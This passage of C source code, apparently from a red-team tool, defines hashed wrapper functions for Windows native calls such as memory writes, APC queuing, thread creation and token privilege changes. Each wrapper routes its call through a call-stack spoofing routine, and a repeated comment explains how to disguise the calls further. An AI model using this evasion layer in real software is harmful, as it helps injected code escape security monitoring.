    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x082E7B459;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenProcessTokenEx(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, PHANDLE TokenHandle) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)HandleAttributes;
    Params.param[4] = (DWORD_PTR)TokenHandle;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x030937E54;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryPerformanceCounter(PLARGE_INTEGER PerformanceCounter, PLARGE_INTEGER PerformanceFrequency) {
    Params.param[1] = (DWORD_PTR)PerformanceCounter;
    Params.param[2] = (DWORD_PTR)PerformanceFrequency;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x037EA4CE7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    Params.param[1] = (DWORD_PTR)KeyHandle;
    Params.param[2] = (DWORD_PTR)Index;
    Params.param[3] = (DWORD_PTR)KeyInformationClass;
    Params.param[4] = (DWORD_PTR)KeyInformation;
    Params.param[5] = (DWORD_PTR)Length;
    Params.param[6] = (DWORD_PTR)ResultLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x086BF8D20;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)IoStatusBlock;
    Params.param[5] = (DWORD_PTR)ShareAccess;
    Params.param[6] = (DWORD_PTR)OpenOptions;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x0B265E2D2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
    Params.param[1] = (DWORD_PTR)Alertable;
    Params.param[2] = (DWORD_PTR)DelayInterval;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0306872B5;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)FileInformation;
    Params.param[7] = (DWORD_PTR)Length;
    Params.param[8] = (DWORD_PTR)FileInformationClass;
    Params.param[9] = (DWORD_PTR)ReturnSingleEntry;
    Params.param[10] = (DWORD_PTR)FileName;
    Params.param[11] = (DWORD_PTR)RestartScan;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 11;
    Params.FuncHash = 0x0B2198292;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)SystemInformationClass;
    Params.param[2] = (DWORD_PTR)SystemInformation;
    Params.param[3] = (DWORD_PTR)SystemInformationLength;
    Params.param[4] = (DWORD_PTR)ReturnLength;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 4;
    Params.FuncHash = 0x09E349EA7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x009A5E9F3;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryTimer(HANDLE TimerHandle, TIMER_INFORMATION_CLASS TimerInformationClass, PVOID TimerInformation, ULONG TimerInformationLength, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TimerHandle;
    Params.param[2] = (DWORD_PTR)TimerInformationClass;
    Params.param[3] = (DWORD_PTR)TimerInformation;
    Params.param[4] = (DWORD_PTR)TimerInformationLength;
    Params.param[5] = (DWORD_PTR)ReturnLength;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0B11BE1B8;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFsControlFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG FsControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)Event;
    Params.param[3] = (DWORD_PTR)ApcRoutine;
    Params.param[4] = (DWORD_PTR)ApcContext;
    Params.param[5] = (DWORD_PTR)IoStatusBlock;
    Params.param[6] = (DWORD_PTR)FsControlCode;
    Params.param[7] = (DWORD_PTR)InputBuffer;
    Params.param[8] = (DWORD_PTR)InputBufferLength;
    Params.param[9] = (DWORD_PTR)OutputBuffer;
    Params.param[10] = (DWORD_PTR)OutputBufferLength;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 10;
    Params.FuncHash = 0x069D3A98B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)NumberOfBytesToWrite;
    Params.param[5] = (DWORD_PTR)NumberOfBytesWritten;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x007901F0F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCloseObjectAuditAlarm(PUNICODE_STRING SubsystemName, PVOID HandleId, BOOLEAN GenerateOnClose) {
    Params.param[1] = (DWORD_PTR)SubsystemName;
    Params.param[2] = (DWORD_PTR)HandleId;
    Params.param[3] = (DWORD_PTR)GenerateOnClose;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x036D53440;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDuplicateObject(HANDLE SourceProcessHandle, HANDLE SourceHandle, HANDLE TargetProcessHandle, PHANDLE TargetHandle, ACCESS_MASK DesiredAccess, ULONG HandleAttributes, ULONG Options) {
    Params.param[1] = (DWORD_PTR)SourceProcessHandle;
    Params.param[2] = (DWORD_PTR)SourceHandle;
    Params.param[3] = (DWORD_PTR)TargetProcessHandle;
    Params.param[4] = (DWORD_PTR)TargetHandle;
    Params.param[5] = (DWORD_PTR)DesiredAccess;
    Params.param[6] = (DWORD_PTR)HandleAttributes;
    Params.param[7] = (DWORD_PTR)Options;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x0ECBFE423;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryAttributesFile(POBJECT_ATTRIBUTES ObjectAttributes, PFILE_BASIC_INFORMATION FileInformation) {
    Params.param[1] = (DWORD_PTR)ObjectAttributes;
    Params.param[2] = (DWORD_PTR)FileInformation;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x022B80BFE;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtClearEvent(HANDLE EventHandle) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0E004F996;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesRead) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)BaseAddress;
    Params.param[3] = (DWORD_PTR)Buffer;
    Params.param[4] = (DWORD_PTR)BufferSize;
    Params.param[5] = (DWORD_PTR)NumberOfBytesRead;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x01D950B1B;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtOpenEvent(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0588D2544;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, ULONG BufferLength, PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength) {
    Params.param[1] = (DWORD_PTR)TokenHandle;
    Params.param[2] = (DWORD_PTR)DisableAllPrivileges;
    Params.param[3] = (DWORD_PTR)NewState;
    Params.param[4] = (DWORD_PTR)BufferLength;
    Params.param[5] = (DWORD_PTR)PreviousState;
    Params.param[6] = (DWORD_PTR)ReturnLength;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x09FAA8D2A;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtDuplicateToken(HANDLE ExistingTokenHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, BOOLEAN EffectiveOnly, TOKEN_TYPE TokenType, PHANDLE NewTokenHandle) {
    Params.param[1] = (DWORD_PTR)ExistingTokenHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)EffectiveOnly;
    Params.param[5] = (DWORD_PTR)TokenType;
    Params.param[6] = (DWORD_PTR)NewTokenHandle;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 6;
    Params.FuncHash = 0x073D14748;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtContinue(PCONTEXT ContextRecord, BOOLEAN TestAlert) {
    Params.param[1] = (DWORD_PTR)ContextRecord;
    Params.param[2] = (DWORD_PTR)TestAlert;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00880F3E0;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryDefaultUILanguage(PLANGID DefaultUILanguageId) {
    Params.param[1] = (DWORD_PTR)DefaultUILanguageId;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 1;
    Params.FuncHash = 0x0C90B3652;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueueApcThread(HANDLE ThreadHandle, PKNORMAL_ROUTINE ApcRoutine, PVOID ApcArgument1, PVOID ApcArgument2, PVOID ApcArgument3) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)ApcRoutine;
    Params.param[3] = (DWORD_PTR)ApcArgument1;
    Params.param[4] = (DWORD_PTR)ApcArgument2;
    Params.param[5] = (DWORD_PTR)ApcArgument3;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x036932C35;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtYieldExecution() {
    Params.param[1] = 0;
    Params.param[2] = 0;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 0;
    Params.FuncHash = 0x04AEC360F;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtAddAtom(PWSTR AtomName, ULONG Length, PUSHORT Atom) {
    Params.param[1] = (DWORD_PTR)AtomName;
    Params.param[2] = (DWORD_PTR)Length;
    Params.param[3] = (DWORD_PTR)Atom;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 3;
    Params.FuncHash = 0x0F260F7F2;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateEvent(PHANDLE EventHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, EVENT_TYPE EventType, BOOLEAN InitialState) {
    Params.param[1] = (DWORD_PTR)EventHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)EventType;
    Params.param[5] = (DWORD_PTR)InitialState;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0C08BC700;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtQueryVolumeInformationFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FsInformation, ULONG Length, FSINFOCLASS FsInformationClass) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = (DWORD_PTR)FsInformation;
    Params.param[4] = (DWORD_PTR)Length;
    Params.param[5] = (DWORD_PTR)FsInformationClass;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 5;
    Params.FuncHash = 0x0A6208368;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
    Params.param[1] = (DWORD_PTR)SectionHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)MaximumSize;
    Params.param[5] = (DWORD_PTR)SectionPageProtection;
    Params.param[6] = (DWORD_PTR)AllocationAttributes;
    Params.param[7] = (DWORD_PTR)FileHandle;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 7;
    Params.FuncHash = 0x008A00A35;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtFlushBuffersFile(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock) {
    Params.param[1] = (DWORD_PTR)FileHandle;
    Params.param[2] = (DWORD_PTR)IoStatusBlock;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x0A801A296;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtApphelpCacheControl(APPHELPCACHESERVICECLASS Service, PVOID ServiceData) {
    Params.param[1] = (DWORD_PTR)Service;
    Params.param[2] = (DWORD_PTR)ServiceData;
    Params.param[3] = 0;
    Params.param[4] = 0;
    Params.param[5] = 0;
    Params.param[6] = 0;
    Params.param[7] = 0;
    Params.param[8] = 0;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 2;
    Params.FuncHash = 0x00B86631D;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateProcessEx(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, ULONG JobMemberLevel) {
    Params.param[1] = (DWORD_PTR)ProcessHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ParentProcess;
    Params.param[5] = (DWORD_PTR)Flags;
    Params.param[6] = (DWORD_PTR)SectionHandle;
    Params.param[7] = (DWORD_PTR)DebugPort;
    Params.param[8] = (DWORD_PTR)ExceptionPort;
    Params.param[9] = (DWORD_PTR)JobMemberLevel;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 9;
    Params.FuncHash = 0x0D15FE1E7;
    SFSpoof(Params.FuncHash);
    return 0; // 用Ghidra等逆向工具 找到一个间接调用了该Nt*函数的无害高层API函数 并在该行前调用
}

NTSTATUS SFNtCreateThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PCLIENT_ID ClientId, PCONTEXT ThreadContext, PUSER_STACK InitialTeb, BOOLEAN CreateSuspended) {
    Params.param[1] = (DWORD_PTR)ThreadHandle;
    Params.param[2] = (DWORD_PTR)DesiredAccess;
    Params.param[3] = (DWORD_PTR)ObjectAttributes;
    Params.param[4] = (DWORD_PTR)ProcessHandle;
    Params.param[5] = (DWORD_PTR)ClientId;
    Params.param[6] = (DWORD_PTR)ThreadContext;
    Params.param[7] = (DWORD_PTR)InitialTeb;
    Params.param[8] = (DWORD_PTR)CreateSuspended;
    Params.param[9] = 0;
    Params.param[10] = 0;
    Params.param[11] = 0;
    Params.param[12] = 0;
    Params.param[13] = 0;
    Params.param[14] = 0;
    Params.param[15] = 0;
    Params.param[16] = 0;
    Params.param[17] = 0;
    Params.ParamNum = 8;
